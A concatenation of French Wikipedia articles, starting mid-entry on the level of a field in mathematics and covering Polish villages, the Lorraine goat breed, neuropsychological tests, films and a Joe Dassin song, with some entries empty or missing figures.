Les éléments et sont tous deux des sommes de "n" carrés donc — d'après la théorie des — leur produit aussi, c'est-à-dire qu'il existe des éléments de "F" tels que
Comme est non nul par définition de "k", on en déduit
si bien que "s"("F") = "n" = 2.
Caractéristique non nulle.
Si "F" est de caractéristique "p" &gt; 0 alors "s"("F") ≤ 2.
Si "p" = 2 alors –1 = 1 = 1 donc "s"("F") = 1.
Si "p" &gt; 2, le sous-corps premier de "F" est le corps fini F. L'ensemble "S" des carrés d'éléments de F donc l'ensemble –1 – "S" aussi, si bien que leur intersection est un singleton donc est non vide : il existe deux éléments "x" et "y" de F tels que "x" = –1 – "y" donc –1 = "x" + "y".
Propriétés.
Le niveau "s"("F") d'un corps "F" est relié à son nombre de Pythagore "p"("F") par "p"("F") ≤ "s"("F") + 1 et même, si "F" n'est pas formellement réel, "s"("F") ≤ "p"("F") ≤ "s"("F") + 1.
L'ordre additif de la forme (1) — donc l'exposant du groupe de Witt de "F" — est égal à 2"s"("F").

</doc>
<doc id="7899950" url="https://fr.wikipedia.org/wiki?curid=7899950" title="Marysinek (Varsovie-ouest)">
Marysinek (Varsovie-ouest)

Marysinek [marɨˈɕinɛk] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 10 kilomètres à l'ouest de Błonie, à 22 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 36 kilomètres à l'ouest de Varsovie.
Le village a une population de 64 habitants en 2000.

</doc>
<doc id="7899952" url="https://fr.wikipedia.org/wiki?curid=7899952" title="Marysinek (powiat de Sochaczew)">
Marysinek (powiat de Sochaczew)



</doc>
<doc id="7899955" url="https://fr.wikipedia.org/wiki?curid=7899955" title="Nowa Górna">
Nowa Górna

Nowa Górna [ˈnɔva ˈɡurna] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7899957" url="https://fr.wikipedia.org/wiki?curid=7899957" title="Alexandre Litovtchenko">
Alexandre Litovtchenko

Alexandre Dmitrievitch Litovtchenko (Алекса́ндр Дми́триевич Лито́вченко), né le 26 (14 en calendrier julien) à Krementchoug (Empire russe) et mort le 28 (16 en calendrier julien) à Saint-Pétersbourg (Empire russe), est un peintre, sujet de l'Empire russe, membre de l'Académie impériale des beaux-arts de Saint-Pétersbourg, membre de la révolte des Quatorze, qui fut l'un des fondateurs de l'artel des artistes (fondé en 1863) et fit partie du mouvement des Ambulants à partir de 1876.

</doc>
<doc id="7899959" url="https://fr.wikipedia.org/wiki?curid=7899959" title="Chèvre de Lorraine">
Chèvre de Lorraine

La Chèvre de Lorraine est une race caprine française originaire du Nord-Est de la France, on la retrouve aujourd'hui principalement en Lorraine. Il s'agit d'une race rustique locale adaptée à l'élevage extensif et de plein air. Les chèvres mesurent au moins au garrot et les boucs plus de pour un poids compris entre 50 et pour les chèvres et plus de 70kg pour les boucs. Leur pelage est à dominance gris herminé (noir et blanc moucheté) avec un poil plutôt rallongé.
La Chèvre de Lorraine est une chèvre laitière dont la production est suffisante pour être rémunératrice du travail de l'éleveur, via des produits laitiers diversifiés "(essentiellement fromages frais et secs). "Cette population caprine a été sélectionnée au fil des ans pour sa rusticité (adaptation aux climats difficiles, valorisation d'une alimentation diversifiée...) mais également pour ses capacités de bonne marcheuse (pâturage, pastoralisme, transhumance). Elle est idéale pour entretenir et débroussailler les friches, espaces verts et sous bois.
L'engagement des éleveurs et de l"'Association des Amis de la Chèvre de Lorraine" a permis le fort développement de la population et sa reconnaissance en tant que race locale à faible effectif en 2013. On dénombre en 2014 plus de 700 animaux et plus de 130 éleveurs. En 2020 on compte plus de 1200 animaux
Histoire.
Origine.
Dans l’histoire rurale lorraine, la chèvre a été un animal de gens pauvres. Aussi, rarement des races de chèvres ont été définies, des standards déposés, des syndicats formés et de concours organisés. En Suisse seulement et dans les Alpes, il y avait la nécessité d’exporter et, dès le , il fut nécessaire de définir des types différents par vallée (Saanen, Toggenburg, Cou noirs du Valais etc.) pour éviter la concurrence et proposer sur le marché un produit identifiable.
Si l’on remonte assez loin dans l’histoire, la chèvre de Lorraine trouve ses origines dans les échanges de bétails qui avaient lieu lors de passages de « caravanes » transitant par la Lotharingie (civilisation arabo-andalouse) au Moyen Âge. Les chèvres offrent à l’homme des ressources multiples (lait, viande, peaux…) et ont souvent fait partie des échanges commerciaux. Elles font partie des transhumances des forêts et des plateaux lorrains vers les Ardennes, mais aussi des marcaires alsaciens et lorrains en directions des Hautes Chaumes vosgiennes.
Les expéditions coloniales de la fin du ont également rapporté d'animaux de races exotiques que la Société Régionales d’Acclimatation de l’Est de la France tentait de croiser avec des races locales pour les améliorer. Plusieurs introductions de chèvres de Nubie et de boucs du Proche Orient sont documentées vers 1855, ce qui introduisit sans doute la coloration mouchetée de la robe.
Dès la fin du , on retrouve la chèvre commune dans des élevages familiaux où elles complémente la basse-cour et assure aux familles un apport en lait et en viande grâce à la consommation des chevreaux. Ce type d’élevage favorise des chèvres capables de s’adapter aux ressources saisonnières. Les animaux consommaient des pousses de terrains en friches, des fourrages d’occasion comme des haies, des chaumes ou encore les épluchures de la cuisine familiale. Ces chèvres peuvent supporter des modifications brusques d’alimentation. Il était fréquent d'avoir dans le village un berger communal chargé de rassembler le petit bétail du village pour les emmener pâturer sur les friches et vaines pâtures.
En parallèle, en grande économie agricole la chèvre était adjointe aux troupeaux ovins et bovins en transhumance. En effet l’Alsace et la Lorraine étant des régions de grande transhumance ovine horizontale, des chèvres figuraient habituellement dans les troupeaux. La facilité d’apprivoisement des caprins permettait une meilleure conduite des troupeaux (chèvres guides et de rappel). En effet les chèvres recherchant la plus grande variété possible de végétaux, consomment les plantes que les moutons ignorent : bardanes, chardons, orties mûres, arbustes, roseaux, ronces et lierres. Elles se tiennent donc en périphérie du troupeau et l’entraînent. De plus leur capacité à bien marcher est entretenue car les moutons lorrains sont de grande taille et bon marcheurs (anciens Wurtembergeois, actuel moutons de l’Est à laine Mérinos).
Les guerres fréquentes qui frappent la Lorraine perturbent la structuration d’une population mais enrichissent aussi ce patrimoine par l’introduction d’animaux importés. Plus tard, l’industrialisation minière et métallurgique de la Lorraine va favoriser l’élevage familial, vivrier et l’économie « de jardin ».
Renouveau.
Jusqu’au début des années 1950, l’élevage de chèvres en Lorraine se trouve majoritairement chez les « petites gens ». C’est seulement vers la fin des années 1950, début des années 1960 que des néo-ruraux choisissent de s’installer en élevage caprin du fait de l’investissement moindre. L'un d'entre eux s'installe à Bouillonville (54). Il circulait dans les campagnes en tant que représentant d’aliment du bétail et achetait des chèvres de pays, des « chèvres à mémères » selon son expression. Il constitua ainsi un troupeau d’une centaine de bêtes et s’installa vers 1964. Rapidement s’instaurait un échange d’animaux avec d’autres éleveurs locaux. En 1972, la Station Régionale de Conservation de la Nature-Zoo de Haye (GECNAL) près de Nancy lui achète 5 chèvres dont le lait servait à allaiter divers jeunes animaux sauvages recueillis.
Les installations de la fin des années 1960 s’orientent majoritairement vers des races de chèvres plus productives. Ces élevages optent pour l’introduction d’Alpines Chamoisées ou de chèvres Poitevines, accompagné d’une intensification des conditions d’élevage, ce qui change progressivement le caractère des animaux vers un élevage plus productif mais moins attentif à la valorisation du terroir de l’Alsace-Lorraine.
À contre-courant, un éleveur s’installe en 1978 avec 8 chèvres et un bouc du zoo de Haye, mais également avec 8 chèvres issues du troupeau d’un berger transhumant d’Einville (54). Il développe son troupeau dans l’esprit de valoriser les spécificités rustiques de ces chèvres tout en améliorant leur production. En 1996, ce troupeau caprin est partagé entre 3 éleveurs, un micro-réseau pour l’échange de reproducteurs a ainsi été constitué. Les créations d’élevages à partir de tels caprins reprennent dès cette époque, comme par ex. vers la fin des années 1990 au Parc animalier de Sainte-Croix (57).
Ainsi apparaît la nécessité d’accompagner l’engouement heureux pour ces animaux avec une sélection orientée vers un maintien des traits historiques afin d’éviter leur absorption par des races plus productives, comme cela s’était déjà produit au début des années 1970.
En parallèle et dans un premier temps sans lien, un groupe d’étudiants de l’ENSAIA de Nancy, réalise un travail de recensement et de caractérisation des animaux identifiés comme « chèvre de Lorraine » en automne 2006. Neuf éleveurs et 78 animaux sont alors recensés sur le territoire. Ce premier chiffrage précis montre l’urgence de s’organiser pour sauver ce qui peut encore l’être, au titre du patrimoine naturel autant que du patrimoine culturel.
L'Association des Amis de la Chèvre de Lorraine est alors créée en , elle compte 14 membres fondateurs. L’engouement pour cette nouvelle association est étonnant et les effectifs – caprin et humain – augmentent très vite. L’association compte fin 2008 une quarantaine d’adhérents issus de 3 horizons différents: les éleveurs professionnels, les éleveurs amateurs et les amateurs passionnés par ces animaux même s’ils n’en possèdent pas eux-mêmes. Il y a également des établissements locaux proches du milieu des animaux domestiques comme la ferme forestière (ancien zoo de Haye), le Parc animalier de Sainte-Croix, l'Espace animalier du Parc de la Pépinière de Nancy, l’ENSAIA de Nancy, l’association F.E.R.M.E ou encore le Fort de Villey-le-Sec qui adhèrent à l’association et participent ainsi au développement de cette population caprine.
L’association compte aujourd’hui des éleveurs dans des départements limitrophes de la Lorraine comme les Ardennes, la Haute-Marne, le Haut-Rhin et la Haute-Saône et même des éleveurs de chèvres en Lorraine belge. Le fichier généalogique – le « goat book » – mis en place par l’association compte à la fin de l’année 2013 plus de 700 caprins vivant, soit 8 fois plus que l'effectif recensé en 2007.
Description.
La population s'étant constituée par le rassemblement de "chèvres communes", il n'y avait à l'origine pas de standard commun. Les éleveurs se sont alors réunis pour établir en 2009 un standard de la Chèvre de Lorraine. C'est un chèvre laitière plutôt grande, ce qui lui offre une bonne capacité d'ingestion de fourrage. Ses aplombs solides font d'elle une bonne marcheuse.
Aptitudes.
Production laitière.
La race de chèvre de lorraine est une race laitière. La production des chèvres adultes se situe entre 500 et 800 L pour une lactation de 270 jours et celles des primipares entre 300 et 500 L. C'est une production correcte en excluant les conditions intensives d'élevage. Même si elle reste nettement inférieure à celles des chèvres Alpines et Saanen, cette production permet aux éleveurs de dégager un revenu.
Race rustique.
Issues des , les chèvres de Lorraine sont de bonnes marcheuses, ce qui leur permet d'aller explorer les différents terrains que l'on trouve dans l'Est de la France. Sa grande taille lui confère une bonne capacité d'ingestion, c'est une bonne qui s'attaque volontiers aux ligneux, arbustes et broussailles. Elle est valorisée par certains éleveurs dans l'entretien des sous-bois. Cette robustesse et sa rusticité lui permettent de résister aux conditions climatiques plutôt rudes de l'Est de la France, et permet élevage extensif et en plein air tout au long de l'année.
Élevage.
Les éleveurs de chèvres de Lorraine sont de deux catégories : les éleveurs professionnels dont la production laitière et fromagère constitue le principal revenu, et les éleveurs amateurs qui possèdent quelques chèvres et produisent éventuellement du lait et du fromage pour leur consommation personnelle.
Dans les deux cas, l'élevage est extensif et économe en intrants, plus modeste dans les résultats, mais plus favorable à la préservation de l'environnement. L'alimentation et la production laitière visée doivent tenir compte de l'objectif d'élever des animaux en toute saison à l'extérieur. La base de l'alimentation est un fourrage saisonnier, en été il s'agit du pâturage sous toutes ses formes (affouragement en vert, prairies, haies, chaumes...), et en hiver principalement du foin et de l'herbe enrubannée. Le recours à l'ensilage n'est pas accepté car il ne correspond pas au type d'élevage prépondérant. L'apport de concentré est raisonné en fonction de la production laitière des animaux et limité à un maximum de /jour en pleine lactation.
Sauvegarde.
Le programme de conservation de la Chèvre de Lorraine n'a débuté officiellement qu'à la suite de la fondation de l"'Association des Amis de la Chèvre de Lorraine". Même si avant 2007, une poignée d'éleveurs œuvre au maintien de la population, leur regroupement en une association donne un nouvel élan.
Afin de suivre l'évolution de la race et de mener au mieux le programme de conservation, l'association réalise tout au long de l'année des visites d'élevages pour mettre à jour les inventaires et réaliser les classements des animaux. Ces données sont collectées et stockées dans le livre généalogique.
L'objectif de ces suivis est de gérer efficacement la consanguinité à l'échelle de la population. L'association encourage également les éleveurs à s'inscrire au contrôle laitier afin de disposer d'un outil de contrôle de performance des troupeaux. Elle souhaite aussi, à l'instar de plusieurs races caprines locales, développer un programme de cryoconservation des semences.
L'association, par la création d'un réseau d'échange et de retours d'expérience entre les éleveurs, propose un appui technique et une fonction de conseil afin d'accompagner les éleveurs et de les soutenir en mettant à leur disposition des outils de gestion.
L"'association des Amis de la Chèvre de Lorraine" joue un rôle important de promotion de la race, cela mobilise l'ensemble des membres de l'association : adhérents, administrateurs et animatrice sont souvent présents dans des manifestations agricoles locales, régionales et nationales. L'association participe entre autres à la Table Vosgienne à St-Dié-des-Vosges, au StanElevage à Lunéville, au Salon AgriMax à Metz, au Printemps des chèvres à Faverges et même au Salon International de l'Agriculture à Paris.
Diffusion.
La Chèvre de Lorraine peut être élevée partout, il n'y a pas de clause géographique imposée, cependant on la trouve majoritairement dans l'Est et le Nord-Est de la France où elle a ses origines. En 1873, l'administration de l'Empire allemand des trois départements alsaciens-lorrains dénombre chèvres. Ce cheptel passera à en 1907 puis en 1919. Si la population caprine a été très forte au début du , elle décline dès la fin des années 1920, le lait de vache étant plus attractif et plus abondant que le lait de chèvre. En 1942, il reste 7000 chèvres dans les Vosges, 3000 en Meurthe-et-Moselle et 2000 en Meuse. Cette diminution n'a pas cessé depuis.
Aujourd'hui c'est en Lorraine que se concentre la majorité des effectifs, avec 96 éleveurs et plus de 500 caprins répartis dans les quatre départements de Meuse, Meurthe-et-Moselle, Moselle et Vosges. On retrouve également des chèvres de Lorraine en Belgique et en Champagne-Ardenne (Ardennes et Haute-Marne) où l"'Association des Amis de la Chèvre de Lorraine" y a dénombré un peu plus de 100 individus. Plusieurs éleveurs sont aussi installés en Alsace (Haut-Rhin et Bas-Rhin) avec un peu plus de 60 caprins. La chèvre de lorraine est encore élevée dans d'autres départements, tels que la Côte-d'Or en Bourgogne, le Doubs et la Haute-Saône en Franche Comté, l'Isère en Rhône-Alpes ou encore le Loiret dans le Centre.

</doc>
<doc id="7899962" url="https://fr.wikipedia.org/wiki?curid=7899962" title="Nowa Wieś (Varsovie-ouest)">
Nowa Wieś (Varsovie-ouest)

Nowa Wieś [ˈnɔva ˈvjɛɕ] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 5 kilomètres à l'ouest de Błonie, à 18 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 31 kilomètres à l'ouest de Varsovie.
Le village a une population de 56 habitants en 2000.

</doc>
<doc id="7899963" url="https://fr.wikipedia.org/wiki?curid=7899963" title="Scream, Dracula, Scream!">
Scream, Dracula, Scream!

Scream, Dracula, Scream! est un album de Rocket from the Crypt, sorti en 1995.
L'album.
Enregistré aux studios Gold Star de Hollywood, il s'agit d'un album ininterrompu, les plages intermédiaires entre les chansons étant remplacées par des bois, des cuivres et des cordes. Il fait partie des 1001 albums qu'il faut avoir écoutés dans sa vie.

</doc>
<doc id="7899964" url="https://fr.wikipedia.org/wiki?curid=7899964" title="Harris County Civil Justice Center">
Harris County Civil Justice Center

Le Harris County Civil Justice Center est un gratte-ciel de de hauteur, construit à Houston au Texas de 2003 à 2005. Il abrite un palais de justice pour le Comté de Harris, l'un des plus importants comtés des États-Unis, qui comprend la ville de Houston. Il y a 37 salles d'audience et l'immeuble est desservi par 13 ascenseurs.
Le gratte-ciel est de style post-moderne et néo-classique (colonnade). C'est l'un des très rares exemple de gratte-ciel construit au qui intègre des éléments néoclassiques. 
Le bâtiment a coûté 119 millions de $.
L'architecte de l'immeuble est l'agence Pierce Goodwin Alexander &amp; Linville (PGAL).

</doc>
<doc id="7899966" url="https://fr.wikipedia.org/wiki?curid=7899966" title="Nowe Faszczyce">
Nowe Faszczyce

Nowe Faszczyce [ˈnɔvɛ faʂˈt͡ʂɨt͡sɛ] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7899968" url="https://fr.wikipedia.org/wiki?curid=7899968" title="Nowy Łuszczewek">
Nowy Łuszczewek

Nowy Łuszczewek [ˈnɔvɨ wuʂˈt͡ʂɛvɛk] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7899973" url="https://fr.wikipedia.org/wiki?curid=7899973" title="Odrzywół (Varsovie-ouest)">
Odrzywół (Varsovie-ouest)

Odrzywół [ɔˈdʐɨvuu̯] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 6 kilomètres à l'ouest de Błonie, à 19 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 33 kilomètres à l'ouest de Varsovie.
Le village a une population de 44 habitants en 2000.

</doc>
<doc id="7899983" url="https://fr.wikipedia.org/wiki?curid=7899983" title="Test de la Tour de Londres">
Test de la Tour de Londres

Le test de la Tour de Londres fut élaboré par T. Shallice en 1982 afin d'investiguer les troubles de la planification de l'action chez les patients atteints de lésions frontales.
Ce test permet de vérifier les capacités de planification, d'organisation, de planification spatiale et les fonctions exécutives.
Ce test est sensiblement identique à ceux des Tours de Hanoï et des Tours de Toronto.
Passation.
Le test de la Tour de Londres est composé d'une base en bois sur laquelle sont disposés linéairement trois piquets d'une hauteur différente. On compte également trois boules (stimuli) de couleurs différentes (rouge, bleue &amp; verte) pouvant s'insérer sur les trois piquets (cf. figure 1).
Sur le plus grand piquet on peut insérer les trois boules, sur le moyen, deux boules et sur le petit piquet, une seule boule. Les boules peuvent ainsi être arrangées sur les piquets de façon à former différents modèles (cf."Target Stacks" sur la figure 2).
On compte 14 modèles distincts représentés sur des cartes; les deux premières étant utilisées pour des vérifications de compréhension du test, c'est à partir des 12 autres cartes que s'effectue véritablement le test.
Les cartes 1 &amp; 2 requièrent deux déplacements, les cartes 3 &amp; 4, trois déplacements, les cartes 5 à 8, quatre déplacements et finalement les cartes 9 à 12, cinq déplacements.
Le sujet a 60 secondes pour résoudre, c'est-à-dire planifier et exécuter, chacun des problèmes et il peut utiliser plus d'un essai pour ce faire.
Dans les premiers problèmes, les exigences en planification sont minimes et une stratégie de passage immédiat à l'action sans planifier est possible; dans les problèmes de niveau moyen de difficulté, une analyse des moyens par rapport au but est requise, puisque la stratégie simple de passer immédiatement à l'action ne serait efficace que dans le cas où le premier déplacement effectué serait un déplacement non évident à première vue; enfin, dans les problèmes plus difficiles, la planification est particulièrement complexe.
Aspects neurologiques.
Les régions du cerveau dont l'activation est corrélée en Tomographie par Émission de Positrons avec la réalisation de la tour de Londres incluent :

</doc>
<doc id="7899985" url="https://fr.wikipedia.org/wiki?curid=7899985" title="Besharam (film, 2013)">
Besharam (film, 2013)

Besharam (बेशरम) est un film indien réalisé par Abhinav Kashyap, sorti en 2013. 
Les acteurs principaux sont Ranbir Kapoor et Pallavi Sharda, qui tiennent le rôle de Babli et de Tara. 
Le film a fait l'objet de critiques négatives dès sa sortie le et a été considéré comme un échec par le "Box Office India" quatre jours après sa sortie.
Synopsis.
Babli est un orphelin. Lui et son ami Titu sont des voleurs de voitures professionnels. Ils les vendent en changeant les plaques, craignant que la police ne les attrapent. Tout l'argent qu'ils gagnent est offert à un orphelinat, pour que les enfants aient un avenir meilleur. Babli tombe amoureux de Tara dont il vole la voiture, ce qui la contrarie profondément. Pour gagner son amour, Babli essaye de retrouver sa voiture. L'histoire se termine par l'adoption de Babli par le couple sans enfant formé par deux policiers, Chulbul et Bulbul Chautala, bien décidés à ne pas le laisser redevenir un voleur.

</doc>
<doc id="7899986" url="https://fr.wikipedia.org/wiki?curid=7899986" title="Pass (Varsovie-ouest)">
Pass (Varsovie-ouest)

Pass [pass] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 4 kilomètres à l'ouest de Błonie, à 17 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 30 kilomètres à l'ouest de Varsovie.
Le village a une population de 470 habitants en 2000.

</doc>
<doc id="7899987" url="https://fr.wikipedia.org/wiki?curid=7899987" title="Piorunów (Mazovie)">
Piorunów (Mazovie)

Piorunów [pjɔˈrunuf] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 4 kilomètres à l'ouest de Błonie, à 16 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 30 kilomètres à l'ouest de Varsovie.

</doc>
<doc id="7899991" url="https://fr.wikipedia.org/wiki?curid=7899991" title="Piorunów">
Piorunów

En Pologne, Piorunów peut faire référence à :

</doc>
<doc id="7899995" url="https://fr.wikipedia.org/wiki?curid=7899995" title="Radonice (Varsovie-ouest)">
Radonice (Varsovie-ouest)

Radonice [radɔˈnit͡sɛ] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ à l'ouest de Błonie, à à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à à l'ouest de Varsovie.
En 2000, le village a une population de 216 habitants.

</doc>
<doc id="7899997" url="https://fr.wikipedia.org/wiki?curid=7899997" title="Radzików (Mazovie)">
Radzików (Mazovie)

Radzików [raˈd͡ʑikuf] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Le village a une population de 927 habitants en 2005.

</doc>
<doc id="7900001" url="https://fr.wikipedia.org/wiki?curid=7900001" title="Saison 1 d'Un cas pour deux 2014">
Saison 1 d'Un cas pour deux 2014

Cet article présente les épisodes de la trente-troisième saison de la série télévisée allemande Un cas pour deux (série télévisée 2014).

</doc>
<doc id="7900003" url="https://fr.wikipedia.org/wiki?curid=7900003" title="Radzików-Wieś">
Radzików-Wieś

Górna Wieś [raˈd͡ʑikuf ˈvjɛɕ] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ au nord de Błonie, à au nord-ouest de Ożarów Mazowiecki (le chef-lieu du district), et à à l'ouest de Varsovie.
Le village a une population de 927 en 2006

</doc>
<doc id="7900004" url="https://fr.wikipedia.org/wiki?curid=7900004" title="Rochaliki">
Rochaliki

Rochaliki [rɔxaˈliki] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7900010" url="https://fr.wikipedia.org/wiki?curid=7900010" title="Brial">
Brial



</doc>
<doc id="7900011" url="https://fr.wikipedia.org/wiki?curid=7900011" title="Bourek laadjine">
Bourek laadjine

Le bourek laadjine est une entrée traditionnelle algérienne.
Description.
Le bourek laadjine est une variété de chausson sablé farci à la viande hachée et aux épices. Cependant, la particularité de ces bricks est qu'elles sont préparées à base de pâte brisée et non de feuille de brick, d'où l'étymologie de ce nom composée de « bourek », signifiant « brick », en arabe algérien et "laadjine" signifiant « pâte ».

</doc>
<doc id="7900012" url="https://fr.wikipedia.org/wiki?curid=7900012" title="Rokitno (Mazovie)">
Rokitno (Mazovie)

Rokitno [rɔˈkitnɔ] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 4 kilomètres au sud-est de Błonie, à 10 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 24 kilomètres à l'ouest de Varsovie.
Le village a une population de 171 habitants en 2000.

</doc>
<doc id="7900015" url="https://fr.wikipedia.org/wiki?curid=7900015" title="Rokitno-Majątek">
Rokitno-Majątek

Rokitno-Majątek [rɔˈkitnɔ maˈjɔntɛk] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7900021" url="https://fr.wikipedia.org/wiki?curid=7900021" title="Test des cubes de Kohs">
Test des cubes de Kohs

Le test des cubes de Kohs permet de mesurer l'expression analytique et synthétique de la pensée conceptuelle et est également utilisé comme test d'intelligence et de développement.
Les cubes de Kohs testent les capacités visuo-spatiales et des habiletés de coordination visuo-motrice.
Histoire.
Ce test est mis en place par le psychologue Samuel Kohs en 1920, alors qu'il prépare sa thèse de doctorat à l'Université Stanford sous la direction de Lewis Terman. La création de ce test est tout à fait originale, puisqu'il s'est inspiré d'un jeu commercialisé, des cubes de couleurs, qu'il a adapté. Le jeu commercial consistait à construire des mosaïques avec 16 cubes de couleurs aux faces unicolores ou bicolores. Dans les années 1920 et 1930 aux États-Unis, la pratique des tests d'intelligence se répandait très rapidement (dans l'industrie, dans les écoles) et de nombreux tests de performance étaient créés pour pallier le côté trop verbal des tests d'intelligence inspirés du test Binet-Simon.
"Kohs déclarait si l'intelligence met en jeu les opérations d'analyse de combinaison de critique, le test des cubes peut en tout justice être considéré comme faisant appel à l'intelligence et dans ces limites comme mesurant ses capacités mentales"
Le cadre théorique ainsi que l'ensemble des données concernant la standardisation et l'interprétation des résultats obtenus à ce test sont contenus dans la monographie publiée en 1923.
"Grace Arthur conserva 17 figures du test original et sa version a pratiquement supplanté celle de Kohs"
Quelques années plus tard, David Wechsler inclut un dans les échelles WISC et WAIS, ce qui rend courante son utilisation dans l'évaluation de l'intelligence.
Passation.
Le patient doit, au moyen de 16 cubes colorés, reproduire les motifs affichés sur une série de patrons qu’on lui propose .
Les 16 cubes sont identiquement peints. Ils ont tous :
Les 17 dessins utilisés dans ce test neuropsychologique sont numérotés en fonction de leur difficulté, le dix-septième étant le plus difficile.
La difficulté croissante est créée en modifiant les patrons par étapes :
La passation du test dure entre 20 et 45 minutes.
Interprétation des résultats.
Les cubes de Kohs requièrent des capacités visuo-spatiales et des habiletés de coordination visuo-motrice. Cette tâche sollicite donc plus particulièrement l'hémisphère droit.
Des recherches ont montré la corrélation entre l'amygdale droite et la mémoire visuo-spatiale.
Les résultats aux tests des cubes sont très peu affectés par les facteurs culturels, notamment scolaires.

</doc>
<doc id="7900025" url="https://fr.wikipedia.org/wiki?curid=7900025" title="Le Kid de la plage">
Le Kid de la plage

Le Kid de la plage (") est un film américain réalisé par Garry Marshall, sorti en 1984.

</doc>
<doc id="7900031" url="https://fr.wikipedia.org/wiki?curid=7900031" title="Et si tu n'existais pas">
Et si tu n'existais pas

Et si tu n'existais pas est une chanson de Joe Dassin parue en 1975 sur son neuvième album "Le Costume blanc". Elle figure sur la face B de "Salut", deuxième single de l'album sorti le . "Et si tu n'existais pas" est également sortie en single au Canada et en Grèce, où les deux faces sont inversées.
Genèse et historique.
"Et si tu n'existais pas" est un slow adapté de la chanson italienne "Oasis" écrite par Vito Pallavicini, composée par Pasquale Losito et Toto Cutugno et destinée pour le groupe de Cutugno, Albatros. Cette chanson n'est finalement pas enregistrée par le groupe, Toto Cutugno préférant confier la chanson à son ami Joe Dassin qui, quelques mois plus tôt, avait interprété l'une de ses compositions, "L'Été indien", devenue un succès international. "Oasis" est finalement enregistrée par Albatros en 1998 et a été incluse dans l'album "Il meglio" la même année.
Premier titre sur l'album "Le Costume blanc", l'adaptation des paroles en français est signée Pierre Delanoë et Claude Lemesle. La chanson est interprétée par Joe Dassin lors de la première émission en couleur sur TF1, le , pour l'émission "Numéro un". Après une sortie promotionnelle destinée essentiellement aux exploitants des juke-box en 1975, "Et si tu n'existais pas" paraît en face B du 45 tours "Salut", qui sort le chez la maison de disques CBS.
Le , Joe Dassin l'enregistre en espagnol sous le titre "Y si tu no has de volver". Cette version sort la même année en 45 tours chez Discos CBS en Argentine et au Chili avec la version française en face B et atteint la place du hit-parade argentin. En Espagne, elle sort en 1977 sous le titre "Y si no existieras".
Thème des paroles.
Les paroles évoquent l'histoire d'un homme qui imagine ce que serait sa vie si la femme qu'il aime n'existait pas. Il chante que sans elle, il n'aurait aucune raison d'exister et que sans elle, tout dans le monde serait dénué de sens. Court extrait : 
Réception.
Le 45 tours "Salut / Et si tu n'existais pas" s'est écoulé à plus de exemplaires en France. "Et si tu n'existais" atteint notamment la place du "Hit-Parade" diffusé sur RTL le 18 avril 1976 et la place du classement officiel du (CIDD). Hors Europe, elle atteint notamment la place du palmarès québécois et la place en Israël.
La chanson connaît ensuite une grande popularité dans l'Union soviétique, puis en Russie, devenant l'une des chansons les plus écoutées dans le pays.
"Et si tu n'existais pas" figure dans la liste des « 10 chansons inoubliables de Joe Dassin » établie par la chaîne musicale Melody en 2023. Sur le site de la chaîne, il est écrit que la .
Reprises et adaptations.
De nombreux artistes ont repris la chanson, parmi lesquels :

</doc>
<doc id="7900033" url="https://fr.wikipedia.org/wiki?curid=7900033" title="Promenades d'été">
Promenades d'été

Promenades d'été est un film français réalisé par René Féret, sorti en 1992.

</doc>
<doc id="7900035" url="https://fr.wikipedia.org/wiki?curid=7900035" title="Passe du Dniestr">
Passe du Dniestr

La passe du Dniestr (en ukrainien , "", en roumain/moldave "portița Nistrului" en Moldavie et "strâmtoarea Țarigrad" en Roumanie) est une passe et le principal chenal mettant en communication le liman du Dniestr au nord-ouest et la mer Noire au sud-est, en Ukraine. Quelques kilomètres plus à l'est se trouve une seconde passe qui n'est pas navigable ("portița Mică" en Moldavie, "strâmtoarea Fântânii" en Roumanie). Les passes sont franchies par deux ponts, routier (route 70) et ferroviaire, reliant la région historique du Boudjak en Bessarabie (au sud-ouest), à celle du Yedisan dans la Steppe pontique (au nord-est), toutes deux englobées dans l'oblast d'Odessa.

</doc>
<doc id="7900038" url="https://fr.wikipedia.org/wiki?curid=7900038" title="Дністровсько-Цареградське гирло">
Дністровсько-Цареградське гирло



</doc>
<doc id="7900041" url="https://fr.wikipedia.org/wiki?curid=7900041" title="Sexualité de Jésus">
